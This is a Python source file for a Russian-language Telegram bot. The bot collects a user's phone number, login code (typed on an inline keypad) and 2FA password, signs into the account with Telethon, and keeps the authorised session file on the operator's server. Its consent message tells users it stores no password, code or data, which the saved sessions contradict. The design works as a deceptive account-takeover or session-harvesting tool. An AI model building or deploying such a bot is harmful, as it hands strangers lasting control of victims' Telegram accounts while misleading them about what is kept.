import os
import asyncio
import logging
from datetime import datetime, timedelta
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import SQLiteSession
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import UserFull

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputMediaPhoto,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)

# ----------------- Импорт из БД -----------------
from db import add_user, get_user, update_user

# ----------------- Логирование -----------------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ----------------- Загрузка переменных -----------------
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("W_TOKEN")

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

# ----------------- Состояния -----------------
ASK_AGREE, ASK_PHONE, WAIT_CODE, WAIT_2FA = range(4)

# ----------------- Глобальные структуры -----------------
clients = {}
phones = {}
codes = {}
timeouts = {}
message_ids = {}
in_progress = {}           # ← Запрет параллельного входа
failed_attempts = {}       # ← Счётчик ошибок
blocked_until = {}         # ← Время разблокировки
last_login_cmd = {}        # ← Rate-limit /login

# ----------------- Константы -----------------
MAX_ATTEMPTS = 3
BLOCK_DURATION = 300       # 5 минут
LOGIN_COOLDOWN = 30        # 30 сек между /login


# ----------------- Утилиты -----------------
def log_attempt(user_id: int, phone: str, success: bool, details: str = ""):
    status = "SUCCESS" if success else "FAIL"
    logger.info(f"LOGIN_ATTEMPT | user_id={user_id} | phone={phone} | {status} | {details}")


async def clear_previous_messages(chat, user_id):
    if user_id in message_ids:
        for msg_id in message_ids[user_id]:
            try:
                await chat.bot.delete_message(chat_id=chat.id, message_id=msg_id)
            except:
                pass
        del message_ids[user_id]


def get_code_keyboard():
    rows = [
        ["1", "2", "3"],
        ["4", "5", "6"],
        ["7", "8", "9"],
        ["0"]
    ]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(txt, callback_data=f"code_{txt}") for txt in row]
        for row in rows
    ] + [[InlineKeyboardButton("⌫", callback_data="code_back")]])


async def check_session_valid(user_id: int) -> TelegramClient | None:
    session_path = os.path.join(SESSIONS_DIR, str(user_id))
    if not os.path.exists(session_path + ".session"):
        return None

    client = TelegramClient(SQLiteSession(session_path), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None

        me = await client.get_me()
        if not me:
            await client.disconnect()
            return None

        return client
    except Exception as e:
        logger.error(f"Session error for {user_id}: {e}")
        try:
            await client.disconnect()
        except:
            pass
        return None


async def send_profile(update: Update, client: TelegramClient):
    me = await client.get_me()
    full: UserFull = await client(GetFullUserRequest(me))

    photos = await client.get_profile_photos(me)
    photo_file = None
    if len(photos) > 0:
        photo_file = await client.download_profile_photo(me, file=bytes)
    
    bio = getattr(full.full_user, 'about', None) or "Не указано"
    expires = "Неограничено"
    if hasattr(client.session, 'expires') and client.session.expires:
        expires = datetime.fromtimestamp(client.session.expires).strftime("%d.%m.%Y %H:%M")

    text = (
        f"Профиль: {me.first_name or ''} {me.last_name or ''}".strip() + "\n"
        f"@{me.username}\n"
        f"Телефон: <code>+{me.phone}</code>\n"
        f"Bio: {bio}\n"
        f"Сессия действительна до: <code>{expires}</code>"
    )

    if photo_file:
        await update.message.reply_photo(photo=photo_file, caption=text, parse_mode="HTML")
    else:
        await update.message.reply_text(text, parse_mode="HTML")

    await client.disconnect()


# ----------------- /login -----------------
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    now = datetime.now()

    # --- Rate-limit /login ---
    if user_id in last_login_cmd:
        if now - last_login_cmd[user_id] < timedelta(seconds=LOGIN_COOLDOWN):
            remaining = int(LOGIN_COOLDOWN - (now - last_login_cmd[user_id]).total_seconds())
            await update.message.reply_text(f"Подождите {remaining} сек. перед повторной командой.")
            return ConversationHandler.END
    last_login_cmd[user_id] = now

    # --- Проверка блокировки ---
    if user_id in blocked_until and now < blocked_until[user_id]:
        remaining = int((blocked_until[user_id] - now).total_seconds())
        await update.message.reply_text(f"Слишком много попыток. Подождите {remaining} сек.")
        return ConversationHandler.END

    # --- Запрет параллельного входа ---
    if user_id in in_progress and in_progress[user_id]:
        await update.message.reply_text("Вы уже в процессе входа. Дождитесь завершения или используйте /cancel.")
        return ConversationHandler.END
    in_progress[user_id] = True

    user = get_user(user_id)

    if user_id not in message_ids:
        message_ids[user_id] = []

    # Сброс попыток при новом старте
    failed_attempts[user_id] = 0
    #https://telegra.ph/Polzovatelskoe-Soglashenie-dlya-Telegram-bota-readnotifiertgclientbot-10-31
    if not user or not user.agree:
        text = (
            "Внимание! Этот процесс предназначен для входа в ваш Telegram-аккаунт через клиент (userbot).\n"
            "Бот не хранит ваш пароль, код или данные.\n"
            "Используя этот сервис, вы соглашаетесь с <a href=\"https://telegra.ph/Polzovatelskoe-Soglashenie-dlya-Telegram-bota-readnotifiertgclientbot-10-31\">пользовательским соглашением</a>.\n\n"
            "Нажмите Я согласен, чтобы продолжить."
        )
        kb = ReplyKeyboardMarkup([[KeyboardButton("Я согласен")]], resize_keyboard=True)
        msg = await update.message.reply_text(text, reply_markup=kb, parse_mode='HTML')
        message_ids[user_id].append(msg.message_id)
        return ASK_AGREE

    client = await check_session_valid(user_id)
    if client:
        msg = await update.message.reply_text("Сессия найдена. Проверяю...")
        message_ids[user_id].append(msg.message_id)

        try:
            await msg.delete()
        except:
            pass
        if msg.message_id in message_ids[user_id]:
            message_ids[user_id].remove(msg.message_id)

        await send_profile(update, client)
        await clear_previous_messages(update.effective_chat, user_id)
        in_progress[user_id] = False
        return ConversationHandler.END

    msg = await update.message.reply_text("Сессия не найдена или недействительна. Вход...")
    message_ids[user_id].append(msg.message_id)

    kb = ReplyKeyboardMarkup([[KeyboardButton("Отправить номер", request_contact=True)]], resize_keyboard=True)
    msg = await update.effective_chat.send_message("Нажмите кнопку, чтобы отправить номер телефона", reply_markup=kb)
    message_ids[user_id].append(msg.message_id)
    return ASK_PHONE


# ----------------- Пользователь согласился -----------------
async def agree_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if text != "Я согласен":
        return ASK_AGREE

    user = get_user(user_id)
    if not user:
        add_user(tg_id=user_id, agree=True)
    else:
        update_user(tg_id=user_id, agree=True)

    try:
        await update.message.delete()
    except:
        pass

    await update.message.reply_text("Спасибо! Теперь отправьте номер телефона:", reply_markup=ReplyKeyboardRemove())
    kb = ReplyKeyboardMarkup([[KeyboardButton("Отправить номер", request_contact=True)]], resize_keyboard=True)
    msg = await update.effective_chat.send_message("Нажмите кнопку, чтобы отправить номер телефона", reply_markup=kb)
    message_ids[user_id].append(msg.message_id)
    return ASK_PHONE


# ----------------- Получаем номер -----------------
async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message.contact is None:
        return ASK_PHONE

    phone = update.message.contact.phone_number
    phones[user_id] = phone

    try:
        await update.message.delete()
    except:
        pass

    msg = await update.effective_chat.send_message("Получен номер. Ожидаю код...", reply_markup=ReplyKeyboardRemove())
    message_ids[user_id].append(msg.message_id)

    session_path = os.path.join(SESSIONS_DIR, str(user_id))
    client = TelegramClient(session_path, API_ID, API_HASH)
    clients[user_id] = client
    await client.connect()

    try:
        await client.send_code_request(phone)
        log_attempt(user_id, phone, True, "code_sent")
    except Exception as e:
        log_attempt(user_id, phone, False, f"send_code_error: {e}")
        await update.effective_chat.send_message(f"Ошибка: {e}")
        in_progress[user_id] = False
        return ConversationHandler.END

    codes[user_id] = ""
    timeouts[user_id] = asyncio.get_event_loop().call_later(
        60, lambda: asyncio.create_task(timeout_fail(user_id, update.effective_chat))
    )

    msg = await update.effective_chat.send_message("Введите код:", reply_markup=get_code_keyboard())
    message_ids[user_id].append(msg.message_id)
    return WAIT_CODE


# ----------------- Ввод кода -----------------
async def code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    if data == "code_back":
        codes[user_id] = codes[user_id][:-1]
    else:
        digit = data.split("_")[1]
        codes[user_id] += digit

    dots = "●" * len(codes[user_id])
    await query.edit_message_text(f"Введите код:\n{dots}", reply_markup=get_code_keyboard())

    if len(codes[user_id]) == 5:
        return await finish_code(update, context)

    return WAIT_CODE


# ----------------- Завершаем ввод кода -----------------
async def finish_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    code = codes[user_id]
    client = clients[user_id]
    phone = phones[user_id]

    if user_id in timeouts:
        timeouts[user_id].cancel()
        del timeouts[user_id]

    try:
        await client.sign_in(phone=phone, code=code)
        await client.disconnect()

        log_attempt(user_id, phone, True, "login_success")
        try:
            await query.message.delete()
        except:
            pass

        success_msg = await query.message.chat.send_message("Успешный вход. Сессия сохранена.")
        message_ids[user_id].append(success_msg.message_id)

        await clear_previous_messages(query.message.chat, user_id)
        in_progress[user_id] = False
        return ConversationHandler.END

    except SessionPasswordNeededError:
        failed_attempts[user_id] = failed_attempts.get(user_id, 0) + 1
        log_attempt(user_id, phone, False, "2fa_required")
        if failed_attempts[user_id] >= MAX_ATTEMPTS:
            blocked_until[user_id] = datetime.now() + timedelta(seconds=BLOCK_DURATION)
            await query.edit_message_text(f"Слишком много ошибок. Заблокировано на {BLOCK_DURATION//60} мин.")
            in_progress[user_id] = False
            return ConversationHandler.END
        await query.edit_message_text("Введите пароль 2FA:")
        return WAIT_2FA

    except PhoneCodeInvalidError:
        failed_attempts[user_id] = failed_attempts.get(user_id, 0) + 1
        log_attempt(user_id, phone, False, "invalid_code")
        if failed_attempts[user_id] >= MAX_ATTEMPTS:
            blocked_until[user_id] = datetime.now() + timedelta(seconds=BLOCK_DURATION)
            codes[user_id] = ""
            await query.edit_message_text(f"Слишком много ошибок. Заблокировано на {BLOCK_DURATION//60} мин.")
            in_progress[user_id] = False
            return ConversationHandler.END
        codes[user_id] = ""
        await query.edit_message_text("Неверный код. Попробуйте снова:", reply_markup=get_code_keyboard())
        return WAIT_CODE

    except Exception as e:
        failed_attempts[user_id] = failed_attempts.get(user_id, 0) + 1
        log_attempt(user_id, phone, False, f"sign_in_error: {e}")
        await query.edit_message_text(f"Ошибка входа: {e}")
        in_progress[user_id] = False
        return ConversationHandler.END


# ----------------- 2FA -----------------
async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    client = clients[user_id]
    phone = phones.get(user_id, "unknown")

    try:
        await update.message.delete()
    except:
        pass

    try:
        await client.sign_in(password=password)
        await client.disconnect()
        log_attempt(user_id, phone, True, "2fa_success")

        success_msg = await update.effective_chat.send_message("Успешный вход. Сессия сохранена.")
        message_ids[user_id].append(success_msg.message_id)
    except Exception as e:
        failed_attempts[user_id] = failed_attempts.get(user_id, 0) + 1
        log_attempt(user_id, phone, False, f"2fa_error: {e}")
        if failed_attempts[user_id] >= MAX_ATTEMPTS:
            blocked_until[user_id] = datetime.now() + timedelta(seconds=BLOCK_DURATION)
            await update.effective_chat.send_message(f"Слишком много ошибок. Заблокировано на {BLOCK_DURATION//60} мин.")
        else:
            await update.effective_chat.send_message(f"Ошибка 2FA: {e}")

    await clear_previous_messages(update.effective_chat, user_id)
    in_progress[user_id] = False

    # Очистка
    clients.pop(user_id, None)
    phones.pop(user_id, None)
    codes.pop(user_id, None)

    return ConversationHandler.END


# ----------------- Cancel -----------------
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text("Отменено.")
    await clear_previous_messages(update.effective_chat, user_id)

    if user_id in clients:
        try:
            await clients[user_id].disconnect()
        except:
            pass
        clients.pop(user_id, None)
    codes.pop(user_id, None)
    phones.pop(user_id, None)
    if user_id in timeouts:
        timeouts[user_id].cancel()
        del timeouts[user_id]
    in_progress[user_id] = False
    return ConversationHandler.END


async def timeout_fail(user_id: int, chat):
    phone = phones.get(user_id, "unknown")
    log_attempt(user_id, phone, False, "timeout")
    if user_id in clients:
        try:
            await clients[user_id].disconnect()
        except:
            pass
        del clients[user_id]

    codes.pop(user_id, None)
    phones.pop(user_id, None)
    timeouts.pop(user_id, None)
    await chat.send_message("Время на ввод кода истекло. Попробуйте снова: /login")
    await clear_previous_messages(chat, user_id)
    in_progress[user_id] = False


# ----------------- Main -----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("login", login_start)],
        states={
            ASK_AGREE: [MessageHandler(filters.TEXT & ~filters.COMMAND, agree_received)],
            ASK_PHONE: [MessageHandler(filters.CONTACT, phone_received)],
            WAIT_CODE: [CallbackQueryHandler(code_input)],
            WAIT_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    app.add_handler(conv)

    print("Bot started.")
    app.run_polling()


if __name__ == "__main__":
    main()